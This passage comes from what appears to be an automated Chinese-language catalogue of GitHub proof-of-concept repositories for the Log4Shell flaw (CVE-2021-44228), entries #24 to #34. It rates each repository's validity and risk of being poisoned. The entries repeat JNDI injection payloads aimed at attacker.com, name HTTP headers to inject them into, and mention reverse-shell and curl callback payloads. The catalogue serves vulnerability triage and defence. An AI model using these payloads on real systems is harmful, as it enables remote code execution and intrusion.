1.  **代码量少且简单**：整个仓库的代码非常少，容易审查。
2.  **目的明确**：代码的目的是为了演示 CVE-2021-44228 漏洞的利用，`Main.java` 中的 payload 清晰可见。
3.  **无恶意行为**：代码本身除了触发 JNDI 查找外，没有其他恶意行为，例如文件操作、网络连接等。

但是，仍然存在极低的风险，比如构建脚本或IDE配置中可能存在隐藏的恶意代码。所以给出5%的风险评估。

**利用方式：**

1.  **攻击者控制日志消息：** 攻击者需要找到一种方法，使包含恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的消息被Log4j2记录。
2.  **触发JNDI查找：** 当Log4j2记录包含恶意JNDI查找字符串的消息时，它会尝试通过JNDI连接到攻击者指定的LDAP服务器。
3.  **恶意LDAP服务器：** 攻击者需要设置一个恶意的LDAP服务器，该服务器会返回一个指向恶意Java类的URL。
4.  **远程代码执行：** Log4j2会从URL下载并执行恶意Java类，从而导致远程代码执行。攻击者可以通过这种方式在目标系统上执行任意命令。

**项目地址:** [cuijiung/log4j-CVE-2021-44228](https://github.com/cuijiung/log4j-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #24

**来源**: [CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md](../2021/CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且启用了message lookup substitution功能。攻击者能够控制Log4j2记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的严重远程代码执行漏洞。该漏洞利用了Log4j2的JNDI（Java Naming and Directory Interface）特性，允许攻击者通过控制日志消息或参数，注入恶意的JNDI查找字符串。当Log4j2解析并执行这些字符串时，它会从攻击者控制的LDAP或其他JNDI服务下载并执行任意Java代码，从而实现远程代码执行。 

**有效性：**根据漏洞库信息和搜索结果，此漏洞影响广泛，且存在公开可用的漏洞利用代码，因此该漏洞的利用是有效的。

**投毒风险：**提供的Dockerfile用于构建包含app.jar的镜像。Exploit.java代码尝试建立一个反向shell连接到 `host.docker.internal` 的9000端口。该代码本身并没有发现明显的投毒行为，而是实现了漏洞利用的基本功能，即建立反向shell。`host.docker.internal` 在docker 容器中可以解析为主机的ip地址。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者找到一个应用程序，该程序使用易受攻击版本的Log4j2并记录用户可控的输入。
2.  攻击者将恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/Exploit}`）注入到这些输入中。
3.  当Log4j2记录包含恶意字符串的日志消息时，它会尝试解析JNDI查找。
4.  Log4j2连接到攻击者控制的LDAP服务器（或其它JNDI服务）。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2从URL下载并执行恶意Java类，从而实现远程代码执行。例如提供的Exploit.java。
7.  Exploit.java 代码，会尝试创建一个反向shell，连接到攻击者指定的 `host:port` ，从而控制目标系统。

**项目地址:** [d4ngkh04w/CVE-2021-44228-Apache-Log4j](https://github.com/d4ngkh04w/CVE-2021-44228-Apache-Log4j)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #25

**来源**: [CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md](../2021/CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且启用了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行任意代码。漏洞利用方式如下：

1.  **攻击者发送恶意请求：** 攻击者向目标系统发送一个包含特定格式的字符串（例如 `${jndi:ldap://attacker.com/exploit}`）的请求，这个字符串会被 Log4j2 记录。
2.  **Log4j2 解析恶意字符串：** 当 Log4j2 尝试记录包含`${jndi:...}`的字符串时，它会触发 JNDI lookup。
3.  **JNDI 发起 LDAP 查询：** JNDI 会根据 URL (例如 `ldap://attacker.com/exploit`) 发起 LDAP 查询请求攻击者控制的 LDAP 服务器。
4.  **LDAP 服务器返回恶意引用：** 攻击者的 LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **Log4j2 加载并执行恶意代码：** Log4j2 尝试从指定的 URL 加载并实例化这个 Java 类，从而执行攻击者提供的任意代码。

**有效性：**

根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且存在公开可用的 PoC。提供的漏洞利用代码库是一个用于演示 Log4Shell 漏洞的教育项目，因此其有效性是为了演示漏洞而设计的。

**投毒风险：**

评估此代码库的投毒风险较低，约为 10%。

*   代码库的 `README.md` 文件明确声明其目的是为了教育和演示 Log4Shell 漏洞，并警告用户不要在生产环境中使用。
*   代码库结构清晰，主要包含一个易受攻击的 Spring Boot 应用程序 (`vulnerable-app`)，一个模拟恶意 LDAP 服务器的 `marshalsec` fork，和一个提供恶意 Java 类的 HTTP 服务器 (`payload-server`)。
*   虽然存在通过修改 `Exploit.class` 文件来植入恶意代码的可能性，但这种投毒行为相对容易被发现，因为其主要目的是演示漏洞，所以更可能是测试后门连接，并非投毒代码。
*   代码贡献者 Fabio Eletto 已经明确声明了代码的用途，降低了恶意使用的可能性。

但是，用户仍然需要谨慎使用此代码库，务必在隔离的环境中进行测试，并仔细审查代码以确保安全。

**项目地址:** [fabioeletto/hka-seminar-log4shell](https://github.com/fabioeletto/hka-seminar-log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #26

**来源**: [CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md](../2021/CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，且允许 message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行远程代码。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能，从 LDAP 服务器加载恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是真实且已被广泛利用的。提供的 POC 代码尝试通过构造包含 JNDI 查找的恶意 payload，触发漏洞。

**投毒风险：**
代码主要功能是利用 Log4Shell 漏洞进行扫描和利用。虽然代码本身是为了利用漏洞，但存在一些潜在的风险，可能被恶意修改后进行投毒：

*   **Payload 修改：** 攻击者可以修改 payload，使其执行恶意操作，例如下载并执行其他恶意软件。
*   **LDAP 服务器：** 攻击者可能控制 LDAP 服务器，导致被攻击者下载恶意 payload。
*   **后门植入：** 攻击者可能会在扫描或利用过程中，通过漏洞在目标系统上植入后门，以便长期控制。

综合来看，代码本身具有一定的风险，需要谨慎使用。这里给出10%的投毒风险评估，因为代码的功能和目标较为明确，主要风险在于使用者可能被引导至恶意的LDAP服务器。

**利用方式：**

1.  **构建恶意 Payload：** 攻击者构造包含 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/Exploit}`。
2.  **触发日志记录：** 将恶意 payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头（User-Agent、X-Forwarded-For 等）、POST 请求参数或其他任何会被记录到日志中的输入。
3.  **JNDI 查找：** 当 Log4j2 尝试记录包含恶意 payload 的日志消息时，它会触发 JNDI 查找。
4.  **远程代码执行：** JNDI 查找会导致应用程序连接到攻击者控制的 LDAP 服务器，并下载和执行恶意代码。

提供的漏洞利用代码通过以下步骤尝试利用漏洞：

1.  **启动 LDAP 和 HTTP 服务器：** 使用 `JNDIExploit` 工具启动一个恶意的 LDAP 服务器，用于提供恶意 payload。同时启动一个 HTTP 服务器，用于托管 payload 文件。
2.  **扫描目标 URL：** 从指定的 URL 字典中读取 URL，并向这些 URL 发送包含恶意 payload 的 HTTP 请求。
3.  **注入 Payload 到 HTTP 头：** 将 payload 注入到 `X-Api-Version`、`User-Agent` 和 `X-Forwarded-For` 等常见的 HTTP 头中。
4.  **注入 Payload 到 URL 参数：** 将 payload 注入到 URL 参数中。

通过以上步骤，攻击者可以尝试触发目标应用程序的 Log4j2 漏洞，并执行远程代码。

**项目地址:** [julian911015/Log4j-Scanner-Exploit](https://github.com/julian911015/Log4j-Scanner-Exploit)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #27

**来源**: [CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许消息查找替换功能（默认启用）。攻击者需要能够控制 Log4j2 记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 的 JNDI (Java Naming and Directory Interface) 功能，该功能允许在日志消息中执行 JNDI 查找。如果攻击者可以控制日志消息的内容，他们就可以注入恶意的 JNDI 查找字符串，从而导致 Log4j2 从攻击者控制的 LDAP 或其他 JNDI 服务加载并执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2021-44228 是一个被广泛利用的严重漏洞。 搜索结果中提供了多个关于漏洞分析、缓解措施和利用的链接。虽然提供的漏洞利用代码仓库只包含一个 README.md 文件，信息很少。但考虑到CVE本身的严重性和公开性，判断存在有效的PoC。

**投毒风险：**
提供的漏洞利用代码仓库 `/tmp/b3e5418f03d45523b0a6001074bd0614/README.md` 只包含简单的描述信息 "CVE-2021-44228-Log4Shell-Kiểm thử xâm nhập" (越南语，意思是渗透测试)。**无法直接从该文件判断是否存在投毒代码。** 但从代码仓库的简洁程度来看，作者可能意图引导用户从其他渠道获取EXP，增加了恶意代码嵌入的可能性，**因此存在一定的投毒风险。风险评估为10%**。

**利用方式：**
漏洞利用的核心在于构造包含恶意 JNDI 查找的日志消息，例如：`${jndi:ldap://attacker.com/evil}`。当 Log4j2 记录包含此字符串的消息时，它会尝试连接到 `attacker.com` 上的 LDAP 服务器，并加载和执行从该服务器返回的 Java 代码。

**攻击步骤：**
1.  攻击者找到一个使用 Log4j2 的应用程序，该应用程序会将攻击者可控的数据记录到日志中。
2.  攻击者将包含恶意 JNDI 查找字符串的payload注入到应用程序的输入字段，例如 HTTP Header (User-Agent, X-Forwarded-For等等)、POST 参数、GET 参数或其他任何会被记录到日志中的数据。
3.  当应用程序记录包含该字符串的日志消息时，Log4j2 会尝试执行 JNDI 查找。
4.  如果应用程序配置允许，Log4j2 将连接到攻击者控制的 JNDI 服务器（例如 LDAP），并下载和执行恶意 Java 代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.1 或更高版本。
*   如果无法升级，可以设置系统属性 `log4j2.formatMsgNoLookups=true` 或环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`，以禁用消息查找替换功能。
*   删除 `JndiLookup` 类。

**项目地址:** [khaidtraivch/CVE-2021-44228-Log4Shell-](https://github.com/khaidtraivch/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #28

**来源**: [CVE-2021-44228-mgueye3_Log4Shell.md](../2021/CVE-2021-44228-mgueye3_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI 注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于其 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以控制日志消息或日志消息参数，从而在启用消息查找替换时执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞库信息和大量已公开的漏洞利用案例，此漏洞的利用是有效的。大量资料表明，该漏洞在野外被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个JSON文件，其中包含一组flag，这些flag很可能是CTF挑战或者渗透测试演练中的结果，而不是实际的漏洞利用代码。因此，可以认为不存在投毒代码。

**利用方式：**
1.  攻击者构造包含 JNDI 查找表达式的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用存在漏洞的 Log4j2 版本记录此字符串。
3.  Log4j2 尝试解析 JNDI 查找表达式，并连接到攻击者控制的 LDAP 服务器（或 RMI、DNS 等）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

需要注意的是，从 Log4j 2.15.0 开始，此行为已默认禁用。在 2.16.0 版本（以及 2.12.2、2.12.3 和 2.3.1）中，此功能已完全删除。


**项目地址:** [mgueye3/Log4Shell](https://github.com/mgueye3/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #29

**来源**: [CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md](../2021/CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md)

## CVE-2021-44228-Log4Shell-Honeypot

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和数据泄露

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许log message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一种严重的远程代码执行 (RCE) 漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本（不包括安全版本 2.12.2、2.12.3 和 2.3.1）中。该漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能充分保护免受攻击者控制的 LDAP 和其他 JNDI 相关端点的攻击。

**利用方式：**

攻击者可以控制日志消息或日志消息参数，从而执行从 LDAP 服务器加载的任意代码。这是通过在日志消息中插入包含 JNDI 查找的恶意字符串来实现的，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此日志消息时，它会尝试连接到攻击者控制的 LDAP 服务器，并执行服务器返回的恶意代码。

**有效性：**

根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用的POC代码有效。网上存在大量的利用该漏洞的POC，并且该漏洞已被广泛利用。

**投毒风险：**

提供的代码是Log4Shell Honeypot，目的是为了检测和防御Log4Shell攻击，而不是利用Log4Shell进行攻击。Dockerfile 构建了一个 Python 应用，用于模拟易受攻击的 Log4j2 环境，通过检测特定模式（例如 `${jndi:`）来识别潜在的攻击。主要目的是捕获攻击尝试的相关信息，例如攻击来源 IP 地址、攻击载荷等。尽管从技术角度讲，可以修改该 Honeypot 以包含恶意代码，但从代码的主要功能来看，其目的在于防御，而不是攻击。虽然整体投毒风险较低，但如果有人修改了 Honeypot 的代码，增加了反向shell或者其他恶意代码，那么投毒风险会增加。因此，给出10%的投毒风险评估。

总而言之，这是一个高危漏洞，攻击者可以利用它来远程执行代码。但是，提供的代码是一个honeypot，旨在检测此类攻击，虽然存在被修改后用作恶意用途的可能，但是可能性相对较低。

**项目地址:** [michaelsanford/Log4Shell-Honeypot](https://github.com/michaelsanford/Log4Shell-Honeypot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #30

**来源**: [CVE-2021-44228-moften_Log4Shell.md](../2021/CVE-2021-44228-moften_Log4Shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个关键的远程代码执行漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本中 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)。此漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。 攻击者可以通过控制日志消息或日志消息参数，在启用消息查找替换时，执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞描述和提供的PoC代码，该漏洞的利用是有效的。PoC 通过 JNDI 注入 LDAP URL 来触发漏洞，从而导致远程代码执行。

**投毒风险：**
该仓库的投毒风险评估为10%。虽然PoC本身旨在演示漏洞利用，但 `Exploit.java` 包含执行 `curl http://TU_IP:9999/pwned` 的指令，表明攻击者可以轻易地替换成更具破坏性的命令。`main.py`脚本本身看起来没有明显的恶意代码，但如果攻击者修改`Exploit.java` 并诱导用户使用，则存在风险。 README中包含了从github上克隆`marshalsec`的步骤，如果`marshalsec`库被投毒，也会导致风险。因此，需要仔细审查和验证。

**利用方式：**
1.  **确定目标：** 找到使用易受攻击的 Log4j2 版本的应用程序。
2.  **构造Payload：** 构造包含 JNDI 查找的恶意字符串。例如： `${jndi:ldap://attacker.com/Exploit}`。
3.  **触发日志记录：** 将 Payload 注入到应用程序将会记录的输入字段中，例如 HTTP Headers (User-Agent, Referer, X-Forwarded-For), POST 参数等。
4.  **恶意LDAP服务器：**设置一个恶意的LDAP服务器，当Log4j2尝试去lookup这个URL的时候，从HTTP服务器上获取恶意的Java Class文件并执行。
5.  **远程代码执行：** Log4j2 将连接到攻击者的 LDAP 服务器，检索并执行恶意 Java 代码，从而允许攻击者在目标系统上执行任意命令。

请注意，成功利用此漏洞需要目标应用程序启用消息查找替换，并且能够解析 JNDI 查找。较高版本的 Log4j 默认禁用了此功能，从而缓解了此漏洞。

**项目地址:** [moften/Log4Shell](https://github.com/moften/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #31

**来源**: [CVE-2021-44228-mr-won_Log4shell.md](../2021/CVE-2021-44228-mr-won_Log4shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 🔥 치명적 (CVSS 10.0) - 远程代码执行，完全控制受影响系统

**影响版本:** 2.0-beta9 ~ 2.14.1

**利用条件:** 目标系统使用了存在漏洞的Log4j2版本，且允许Log4j2记录攻击者可控的输入（例如，HTTP请求头、用户输入等），消息lookup substitution is enabled

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的远程代码执行漏洞。攻击者通过将恶意的JNDI lookup字符串（例如 `${jndi:ldap://attacker.com:1389/exploit}`）注入到Log4j2可以记录的任何输入中，即可触发该漏洞。

**有效性：**

提供的漏洞利用代码包含一个README.md文件，该文件描述了Log4Shell漏洞的原理、影响、利用方式、检测和缓解措施。其中包含一个利用示例 `${jndi:ldap://attacker.com:1389/exploit}`，表明该POC有效，可用于触发漏洞。

**利用方式：**

1.  攻击者构造包含恶意JNDI lookup字符串的Payload，例如 `${jndi:ldap://attacker.com:1389/exploit}`。
2.  攻击者将该Payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent，X-Forwarded-For等）、POST请求参数、Web表单字段等。
3.  应用程序使用Log4j2记录包含该Payload的日志条目。
4.  Log4j2在处理日志条目时，解析JNDI lookup字符串，并尝试连接到攻击者控制的LDAP服务器 `attacker.com:1389`。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2下载并执行该恶意Java类，导致远程代码执行。

**投毒风险：**
该README.md 文件分析报告本身不包含恶意代码，但存在潜在的投毒风险，该风险主要来自用户在使用git clone 下载源码时，如果攻击者控制了welk仓库,或者使用docker build 从Dockerfile构建docker镜像时，攻击者可以在Dockerfile中植入恶意代码。因此，代码仓库或镜像来源不可信的情况下，可能存在潜在的风险。因此该仓库中存在投毒代码的可能性较低，但不能完全排除(10%).

**项目地址:** [mr-won/Log4shell](https://github.com/mr-won/Log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #32

**来源**: [CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md](../2021/CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md)

## CVE-2021-44228 (Log4Shell)

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且启用了消息查找替换功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。该漏洞源于Log4j2在配置、日志消息和参数中使用的JNDI功能没有对攻击者控制的LDAP和其他JNDI相关端点提供足够的保护。

**有效性：**

提供的POC代码有效。它设置了一个dockerized环境，包括一个易受攻击的Java应用程序和一个模拟攻击者的LDAP服务器和HTTP服务器。该POC演示了如何通过JNDI注入执行任意代码。

**投毒风险：**

评估该代码的投毒风险约为10%。主要考虑以下几点：

*   `attacker/Payload.java`: 包含反弹shell的代码，存在被恶意修改的可能。
*   `attacker/index.js`和`attacker/ldap-server.js`:  可能被修改为重定向或记录漏洞利用尝试，虽然不直接执行恶意代码，但可以收集信息。
*   虽然大部分代码的功能是明确的，但在`Payload.java`中嵌入更隐蔽的后门或数据收集行为是可能的。因此存在一定的投毒风险。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI查找字符串的请求。例如：`${jndi:ldap://attacker.com/Exploit}`。
2.  如果目标应用程序使用Log4j2记录该请求，它会尝试解析JNDI查找字符串。
3.  Log4j2通过JNDI连接到攻击者控制的LDAP服务器 (attacker.com)。
4.  LDAP服务器返回一个包含指向攻击者控制的HTTP服务器的Java类的引用。
5.  Log4j2从HTTP服务器下载并执行该Java类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**

*   升级到Log4j 2.17.1 或更高版本（此版本完全移除了有问题的 JNDI 功能）。
*   在旧版本中，设置`log4j2.formatMsgNoLookups=true` 或移除`JndiLookup` 类。

**项目地址:** [qw3rtyou/CVE-2021-44228_dockernize](https://github.com/qw3rtyou/CVE-2021-44228_dockernize)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #33

**来源**: [CVE-2021-44228-redhuntlabs_Log4JHunt.md](../2021/CVE-2021-44228-redhuntlabs_Log4JHunt.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入，从 LDAP 服务器加载并执行任意代码。  

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码（Log4JHunt），该漏洞是有效的，并且在野外被广泛利用。Log4JHunt工具旨在自动化检测Log4Shell漏洞。

**投毒风险：**  提供的漏洞利用代码仓库 (Log4JHunt) 主要是一个扫描器，用于检测 Log4Shell 漏洞。通过人工分析代码，发现代码本身存在后门的概率较低。但用户使用第三方工具，仍然存在一定的风险。

仓库中可能存在的潜在风险点：

*   **依赖风险:** 该工具依赖于第三方库，这些库可能存在未知的漏洞或被恶意篡改。但这种风险是普遍存在的，并非该仓库特有。
*   **配置错误风险:** 用户可能配置不当，例如将扫描结果泄露到公共渠道，或者使用弱口令的 DNS callback server，导致信息泄露或被恶意利用。
*   **恶意作者风险：** 作者可能在未来的版本中植入恶意代码，但目前没有证据表明存在这种情况。

综合考虑，此仓库的投毒风险较低，大约为10%。

**利用方式：**

1.  攻击者向目标系统发送包含恶意 JNDI 查找字符串的请求。例如：`${jndi:ldap://attacker.com/evil}`。
2.  如果目标系统使用受影响的 Log4j2 版本记录该请求，Log4j2 会尝试解析 JNDI 查找字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**Log4JHunt 工具的使用方式：**

1.  使用 Log4JHunt 扫描目标系统，可以指定单个 URL 或包含 URL 列表的文件。
2.  Log4JHunt 会向目标系统发送包含恶意 JNDI 查找字符串的请求，并监控 DNS callback server 或 Canarytokens 服务，以判断目标系统是否存在漏洞。
3.  如果目标系统存在漏洞，Log4JHunt 会收到 DNS callback 或 Canarytokens 触发的通知。

**项目地址:** [redhuntlabs/Log4JHunt](https://github.com/redhuntlabs/Log4JHunt)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #34

**来源**: [CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md](../2021/CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包含 security releases 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标应用使用了存在漏洞的Log4j2版本，并且启用了message lookup substitution功能，攻击者能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j 2中的高危远程代码执行漏洞。该漏洞源于Log4j2的JNDI功能，当message lookup substitution功能启用时，攻击者可以通过控制日志消息或日志消息参数，利用JNDI注入，从恶意的LDAP服务器加载并执行任意代码。

**POC有效性：**

根据提供的docker-compose.yaml文件和Dockerfile文件，该POC的目的是创建一个易受攻击的Log4j2 Web应用程序和一个攻击服务器。attack-server 搭建了一个恶意的JNDI服务，用于向目标应用返回恶意payload，实现远程代码执行。

vulnerable-application 使用了tomcat 镜像，部署了 log4shell.war 包，模拟存在漏洞的web应用。

所以POC代码是有效的。

**投毒风险：**

考虑到以下几点，投毒风险评估为10%：

*   **来源可疑：** 漏洞利用代码来自GitHub上公开的JNDI-Exploit-Kit 和 log4j-shell-poc仓库，并说明了原始repository。
*   **简单的命令执行:** JNDI-Exploit-Kit 的Dockerfile中，通过 `-C` 参数执行 curl 命令，如果攻击服务器被篡改或者受到中间人攻击，可能导致执行的命令被替换为恶意代码。
*   **网络依赖：** 该POC依赖于网络连接，如果攻击者可以控制网络流量，可能会劫持请求并注入恶意代码。

虽然存在风险，但是代码的目的相对明确,只是执行`curl` 命令，且给出了原始仓库地址，因此不认为主要目的是投毒，但存在被利用的可能性。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI lookup字符串的请求，例如：`${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用Log4j2记录该请求，触发JNDI lookup。
3.  Log4j2通过JNDI向`attacker.com`的LDAP服务器发起请求。
4.  攻击者的LDAP服务器返回一个包含恶意Java类的JNDI引用。
5.  Log4j2加载并执行该恶意Java类，从而实现远程代码执行。

总结：该漏洞利用简单，危害巨大。POC的有效性高，但存在一定的投毒风险。

**项目地址:** [safeer-accuknox/log4j-shell-poc](https://github.com/safeer-accuknox/log4j-shell-poc)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #35

